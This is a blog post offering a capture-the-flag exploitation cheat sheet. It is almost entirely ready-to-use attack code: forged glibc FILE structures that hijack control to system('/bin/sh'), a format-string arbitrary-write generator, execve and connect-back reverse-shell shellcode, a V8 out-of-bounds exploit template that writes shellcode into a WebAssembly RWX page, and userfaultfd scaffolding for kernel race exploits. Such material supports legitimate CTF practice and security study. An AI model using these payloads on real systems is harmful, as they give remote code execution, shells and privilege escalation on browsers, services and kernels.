---
layout: post
title:  "CTF Cheat Sheet"
date:   9102-01-01 00:00:00 +0000
categories: jekyll update
---

## IO FILE

### House of Orange

```python
fake_file = p64(0)
fake_file += p64(0x61)
fake_file += p64(libc_addr + UNSORT_OFF)
fake_file += p64(libc_addr + e.symbols["_IO_list_all"] - 0x10)
fake_file += p64(2) + p64(3)
fake_file += "\x00" * 8
fake_file += p64(libc_addr + next(e.search('/bin/sh\x00'))) #/bin/sh addr
fake_file += (0xc0-0x40) * "\x00"
fake_file += p32(0) #mode
fake_file += (0xd8-0xc4) * "\x00"
fake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr
fake_file += (0xe8-0xe0) * "\x00"
fake_file += p64(libc_addr + e.symbols["system"])
```

### fclose

```python
#32 bits
fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fake_vtable_addr - 0x44)

#64 bits
fake_file = "/bin/sh\x00" + '\x00' * 0x8
fake_file += p64(system) + '\x00' * 0x70
# the system can also be placed in other memory
fake_file += p64(fake_lock_addr)
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
```

## Format String

```python
def hn(pos, val):
	assert val < 0x10000
	if val == 0:
		return "%" + str(pos) + "$hn"
	else:
		return "%" + str(val) + "c%" + str(pos) + "$hn"

def cont_shoot(poses, vals, prev_size = 0):
	assert len(poses) == len(vals)
	size = len(poses)
	ret = ""
	i = 0
	cur_size = prev_size
	next_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000
	while i < size:
		assert next_overflow >= cur_size
		num = next_overflow - cur_size + vals[i]
		if num < 0x10000:
			ret += hn(poses[i], num)
			next_overflow += 0x10000
		else:
			num = vals[i] - (cur_size - (next_overflow - 0x10000))
			assert num >= 0
			ret += hn(poses[i], num)
		cur_size += num
		i += 1
	return ret
```

## Return to dl-resolve



## Shellcode

```python
asm(pwnlib.shellcraft.amd64.linux.sh())
"push 0x68732f6e69622f\nmov rdi,rsp\nxor rsi,rsi\nxor rdx,rdx\npush SYS_execve\npop rax\nsyscall"
pwnlib.shellcraft.amd64.fork() + "test rax,rax \n jz child \n self: jmp self \n child: \n" + pwnlib.shellcraft.amd64.connect(url, port) + pwnlib.shellcraft.amd64.dupsh()
```

## JavaScript

### Header

```javascript
function dp(x){ %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();
```

### ArrayBuffer and Signature Object

```javascript
gOobArr = [2019.2019];
gAb = new ArrayBuffer(0x321);
gSig = {a:0xdead,b:0xbeef,c:wmain};
```

```javascript
assert(gOobArr.length === 0x1337,
	"failed to corrupt array size");
// now gOobArr have OOB access
// next, we find ArrayBuffer and sig
var backingPos, wmainAddr;
for (let i = 0; i < gOobArr.length-2; i++)
{
	if (d2u(gOobArr[i]) === 0x321)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(gOobArr[i]) === 0xdead00000000 &&
		d2u(gOobArr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(gOobArr[i+2]) - 1;
	}
	if (backingPos !== undefined && wmainAddr !== undefined)
		break; // otherwise GC is triggered
}
assert(backingPos !== undefined, "failed to find ArrayBuffer");
assert(wmainAddr !== undefined, "failed to find sig array");
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));
const dataView = new DataView(gAb);

gOobArr[backingPos] = u2d(wmainAddr-0x300);
for (var i = 0; i < 0x300; i+=8)
{
	rwxAddr = d2u(dataView.getFloat64(i, true));
	if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
		rwxAddr % 0x1000 === 0 &&
		rwxAddr < 0x7fffffffffffff)
		break;
}

assert(i !== 0x300, "failed to find RWX page!");

print("[*] RWX page = " + hex(rwxAddr));

gOobArr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode
readline();
throw Error("failed to get shell");
```

## Linux Kernel

### Setup Scripts

`make.sh`

```bash
musl-gcc exp.c -static -o fs/exp # compile exploit
cd fs && ./gen.sh ../rootfs.cpio 2> /dev/null # generate new cpio with exp
cd .. && ./run.sh # run the kernel
```

`gen.sh`

```bash
find . -print0 \
| cpio --null -ov --format=newc > $1
```

### Frequently Used Header

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}
```

### User Fault FD

```c
#include "userfaultfd.h"
size_t cand_idx;
char buffer[0x1000];

typedef struct _fault_arg
{
	int fd;
	void* fault_page;
}fault_arg;

void* handler(void *arg_)
{
	fault_arg* arg = (fault_arg*)arg_;
	int uffd = arg->fd;
	void* fault_page = arg->fault_page;
	free(arg);
	// fetch arguments

	puts("[*] handler created");
	struct uffd_msg msg;

	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd,1,-1);
	if (nready != 1)
		errExit("wrong poll return value");
	// this will wait until copy_from_user is called on FAULT_PAGE
	printf("trigger! I'm going to hang\n");
	// now main thread stops at copy_from_user function
	// but now we can do some evil operations!

	// PUT YOUR CALLBACK HERE
	// USE GLOBAL VARIABLE TO PASS ARGUMENT IF WE NEED ARGUMENT HERE
	// e.g. USE `cand_idx` HERE

	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
		errExit("error in reading uffd_msg");
	// read a msg struct from uffd, although not used

	struct uffdio_copy uc;
	memset(buffer, 0, sizeof(buffer));
	uc.src = (uintptr_t)buffer;
	uc.dst = (uintptr_t)fault_page;
	uc.len = 0x1000;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	// resume copy_from_user with buffer as data

	puts("[*] done 1");
	// now note1 has length 0xf0

	return NULL;
}

void* register_userfault()
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	int64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd < 0)
		errExit("syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)");
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) < 0)
		errExit("ioctl-UFFDIO_API");
	// create the user fault fd

	void* fault_page = mmap(0,0x1000,7,0x22,-1,0);
	if (fault_page == MAP_FAILED)
		errExit("mmap fault page");
	// create page used for user fault

	ur.range.start = (unsigned long)fault_page;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");
	// register the page into user fault fd
	// so that if copy_from_user accesses fault_page,
	// the access will be hanged, and uffd will receive something

	fault_arg* arg = malloc(sizeof(fault_arg));
	arg->fd = uffd;
	arg->fault_page = fault_page;
	int s = pthread_create(&thr,NULL,handler,(void*)arg);
	if(s!=0)
		errExit("pthread_create");
	// create handler that process the user fault
	return fault_page;
}
```

See [userfaultfd.h](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/userfaultfd.h)